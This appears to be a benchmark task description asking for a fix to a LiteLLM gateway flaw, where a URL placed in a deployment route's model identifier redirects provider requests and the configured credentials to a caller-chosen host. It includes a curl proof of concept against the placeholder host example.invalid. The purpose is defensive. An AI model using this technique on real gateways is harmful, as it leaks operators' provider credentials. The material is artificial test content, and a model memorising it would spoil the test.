# Callers can choose where the gateway sends provider traffic, and the configured credentials follow

## System

LiteLLM is a self-hosted LLM gateway. An operator configures deployments: a name clients
call, the upstream provider and endpoint, and the credentials for it. Clients authenticate
with a proxy key and use OpenAI-compatible HTTP routes: a model identifier picks the
deployment, and it may arrive in the request body, in a query parameter, or in a
deployment-scoped URL path. Multipart routes (file uploads, for example) carry nested
settings as bracket-notation form fields, and management routes can test an upstream
connection for a configured deployment.

## Observed impact

A client holding an ordinary proxy key can make the gateway send a provider request to a
host of the client's choosing, carrying the deployment's configured credential, by placing
a URL where the model identifier belongs in a deployment-scoped route:

```
curl -X POST 'http://gateway:4000/openai/deployments/huggingface/https://example.invalid/v1/chat/completions' \
  -H 'Authorization: Bearer sk-<client-key>' \
  -H 'Content-Type: application/json' \
  -d '{"model": "gpt-4o", "messages": [{"role": "user", "content": "hello"}]}'
```

The body names a legitimate model; the URL path decides the destination. No test sends
traffic to that host — `example.invalid` is a placeholder.

## Security properties that must hold

- No value of a caller-supplied model or file identifier may become a URL-valued outbound
  destination, however the request delivers it: request body, query parameter, URL path, or
  form field. The operator may explicitly allowlist destination hosts; allowlisted hosts
  keep working.
- The same rule covers every caller-supplied request parameter that names an outbound
  destination or an observability endpoint — a provider base address, a cloud service
  endpoint, an observability host — wherever it appears in the request: top level, inside
  nested settings, or as a bracket-notation form field.
- Credentials configured for a deployment must never be sent to a destination the request
  chose. When a request supplies its own destination, the deployment's configured
  credentials, and any reference to a stored credential, must not accompany it.
- Every route that accepts a model identifier obeys these rules, including management
  routes that test a deployment's connectivity.

## Contracts the fix must honor

- **Refusal form.** A refused request is answered with a client error and no outbound
  provider request is made. A management connectivity test that legitimately continues
  instead must proceed without the configured credentials.
- **Names the tests use.** Requests carry the destination as the `model` or `file_id`
  identifier, as an `api_base`, as an `aws_bedrock_runtime_endpoint`, or as a
  `litellm_credential_name` reference. Nested settings arrive under `metadata`,
  `litellm_metadata`, and `extra_body`, either as JSON objects or as bracket-notation form
  fields.
- **Preservation.** A deployment name that is an ordinary string — including one containing
  a provider prefix and a slash — still routes. Destinations on the operator's allowlist
  still route, in the body and in the path. Nested form fields that do not select a
  destination are still delivered to the provider call. The explicit admin opt-in that
  lets callers supply their own connection parameters still works.
- **Connectivity tests.** A configured model named without any connection field still
  inherits the configuration's endpoint and credentials. A request that supplies a complete
  connection of its own — endpoint and key — is tested exactly as sent.

The request above is one instance, not the full set of ways the properties can be violated.

## Constraints

- Fix the flaw and its close variants, not just the request shown.
- Keep every legitimate use working.
- Do not modify or add tests, and do not special-case the example input.
- Do not consult any upstream advisory or fix for this issue.
